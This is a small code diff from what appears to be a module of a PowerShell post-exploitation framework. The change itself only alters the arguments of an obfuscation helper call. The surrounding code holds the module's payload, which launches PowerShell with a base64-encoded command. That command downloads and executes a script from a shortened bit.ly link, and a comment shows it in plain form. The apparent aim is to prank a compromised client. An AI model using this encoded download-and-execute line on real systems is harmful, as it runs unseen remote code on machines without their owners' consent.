@@ -55,5 +55,5 @@ class Module:
         # iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
         script = "$Null = Start-Process -WindowStyle Maximized -FilePath \"C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe\" -ArgumentList \"-enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA\"; 'Client Rick-Asciied!'"
         if obfuscate:
-            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         return script
